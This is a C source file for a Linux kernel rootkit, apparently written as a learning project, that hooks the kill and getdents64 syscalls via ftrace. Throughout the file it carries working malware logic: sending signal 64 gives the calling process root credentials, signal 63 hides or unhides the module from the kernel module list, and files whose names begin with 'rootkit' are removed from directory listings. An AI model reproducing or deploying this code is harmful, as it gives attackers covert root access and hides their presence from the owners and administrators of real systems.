#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/version.h>
#include <linux/list.h>
#include <linux/dirent.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Luong Thang Nguyen");
MODULE_DESCRIPTION("My Rootkit");
MODULE_VERSION("0.1");

/* After Kernel 4.17.0, the way that syscalls are handled changed
 * to use the pt_regs struct instead of the more familiar function
 * prototype declaration. We have to check for this, and set a
 * variable for later on */
#if defined(CONFIG_X86_64) && (LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0))
#define PTREGS_SYSCALL_STUBS 1
#endif

#define PREFIX "rootkit"
static bool hidden = 0;
static struct list_head *prev_save;

/* We now have to check for the PTREGS_SYSCALL_STUBS flag and
 * declare the orig_kill and hook_kill functions differently
 * depending on the kernel version. This is the largest barrier to 
 * getting the rootkit to work on earlier kernel versions. The
 * more modern way is to use the pt_regs struct. */
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_kill)(const struct pt_regs *);

/* We can only modify our own privileges, and not that of another
 * process. Just have to wait for signal 64 (normally unused) 
 * and then call the set_root() function. */
asmlinkage int hook_kill(const struct pt_regs *regs)
{
    void set_root(void);
	void hide_mod(void);
	void show_mod(void);

	int sig = regs->si;

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit@hook_kill: giving root...\n");
        set_root();
        return 0;
    } else if (sig == 63) {
		if (hidden == 0) {
			printk(KERN_INFO "rootkit@hook_kill: hiding rootkit from module lists\n");
			hide_mod();
		} else {
			printk(KERN_INFO "rootkit@hook_kill: unhiding rootkit from module lists\n");
			show_mod();
		}
		hidden = hidden ^ 1;
	}

    return orig_kill(regs);

}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);

asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
	// take dirent from userspace out from rsi register
	struct linux_dirent64 __user *user_dirent = (struct linux_dirent64 *)regs->si;
	
	// for skipping entries
	struct linux_dirent64 *previous_entry;
	// for keep track current entry
	struct linux_dirent64 *current_entry;
	// kernel version of dirent, this is what we will modify on and copy back to userspace
	struct linux_dirent64 *new_dirent;
	
	// acts kinda like an index to determine next dirent
	unsigned long offset = 0;
	
	// get the original total length by running the original getdents64 syscall
	int retval = orig_getdents64(regs);

	// allocate same amount of bytes into our new_dirent
	new_dirent = kzalloc(retval, GFP_KERNEL);

	if ( (retval <= 0) || (new_dirent == NULL) )
        return retval;

    long error;
    error = copy_from_user(new_dirent, user_dirent, retval);
    if(error)
        goto done;

    while (offset < retval)
    {
        current_entry = (void *)new_dirent + offset;
		
		// if file name matches PREFIX , hide it from listing
        if ( memcmp(PREFIX, current_entry->d_name, strlen(PREFIX)) == 0)
        {
            /* Check for the special case when we need to hide the first entry */
            if( current_entry == new_dirent )
            {
                /* Decrement ret and shift all the structs up in memory */
                retval -= current_entry->d_reclen;
                memmove(current_entry, (void *)current_entry + current_entry->d_reclen, retval);
                continue;
            }
            /* Hide the secret entry by incrementing d_reclen of previous_entry by
             * that of the entry we want to hide - effectively "swallowing" it
             */
            previous_entry->d_reclen += current_entry->d_reclen;
        }
        else
        {
            /* Set previous_entry to current_entry before looping where current_entry
             * gets incremented to the next entry
             */
            previous_entry = current_entry;
        }

        offset += current_entry->d_reclen;
    }

    error = copy_to_user(user_dirent, new_dirent, retval);
    if(error)
        goto done;

done:
    kfree(new_dirent);
    return retval;
}

#else
/* 	This is the old way of declaring a syscall hook.
	I will just define one for hook_kill, 
	because the implementation for other functions are roughly the same.
*/
static asmlinkage long (*orig_kill)(pid_t pid, int sig);

static asmlinkage int hook_kill(pid_t pid, int sig)
{
    void set_root(void);

    if ( sig == 64 )
    {
        printk(KERN_INFO "rootkit: giving root...\n");
        set_root();
        return 0;
    }

    return orig_kill(pid, sig);
}
#endif

/* Whatever calls this function will have it's creds struct replaced
 * with root's */
void set_root(void)
{
    /* prepare_creds returns the current credentials of the process */
    struct cred *root;
    root = prepare_creds();

    if (root == NULL)
        return;

    /* Run through and set all the various *id's to 0 (root) */
    root->uid.val = root->gid.val = 0;
    root->euid.val = root->egid.val = 0;
    root->suid.val = root->sgid.val = 0;
    root->fsuid.val = root->fsgid.val = 0;

    /* Set the cred struct that we've modified to that of the calling process */
    commit_creds(root);
}

void hide_mod(void) {
	prev_save = (&THIS_MODULE->list)->prev;
	list_del(&THIS_MODULE->list);
}

void show_mod(void) {
	list_add(&THIS_MODULE->list, prev_save);
}

/* Declare the struct that ftrace needs to hook the syscall */
static struct ftrace_hook hooks[] = {
    HOOK("__x64_sys_kill", hook_kill, &orig_kill),
    HOOK("__x64_sys_getdents64", hook_getdents64, &orig_getdents64),
};

/* Module initialization function */
static int __init rootkit_init(void)
{
    /* Hook the syscall and print to the kernel buffer */
    int err;
    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
    if(err)
        return err;

    printk(KERN_INFO "rootkit: Loaded >:-)\n");

    return 0;
}

static void __exit rootkit_exit(void)
{
    /* Unhook and restore the syscall and print to the kernel buffer */
    fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
    printk(KERN_INFO "rootkit: Unloaded :-(\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
